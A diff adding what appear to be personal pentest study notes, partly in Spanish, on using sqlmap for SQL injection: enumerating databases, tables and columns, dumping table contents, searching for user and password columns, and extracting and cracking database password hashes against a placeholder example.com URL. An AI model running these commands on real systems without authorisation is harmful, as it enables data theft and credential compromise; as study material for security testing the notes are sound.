@@ -97,6 +97,45 @@ extraer campos de una tabla SQLITE:
 
 
 
+
+
+Basic DB Enumeration
+
+    Enumeration usually starts with the retrieval of the basic information:
+
+    Database version banner (switch --banner)
+
+    Current user name (switch --current-user)
+
+    Current database name (switch --current-db)
+
+    Checking if the current user has DBA (administrator) rights.
+
+
+sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
+
+
+para consultar por las bases de datos : --dbs
+luego para enumerar las tablas de una db: -D "database" --tables
+para enumerar el contenido de una tabla : -D "db" -T "table" --dump
+podemos también traer el contenido de una o mas columnas con el comando -C segido de las columnas a enumerar.
+
+
+Advanced Database Enumeration
+sqlmap -u "http://www.example.com/?id=1" --schema
+
+Buscar algo puntual en una base de datos concreta: --search. Con esto sqlmap buscará tanto dbs, tablas y columnas coincidentes. Este comando usa el "LIKE" ej:
+sqlmap -u "http://www.example.com/?id=1" --search -T user (busca una tabla llamada o que contenta la palabra users)
+sqlmap -u "http://www.example.com/?id=1" --search -C pass (busca una columna llamada o que contenta la palabra pass)
+
+
+DB Users Password Enumeration and Cracking:
+
+Para que automáticamente busque passwords de configuración, sqlmap tiene el comando --password
+
+sqlmap -u "http://www.example.com/?id=1" --passwords --batch
+
+
 PAYLOADALLTHETHINGS:
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 
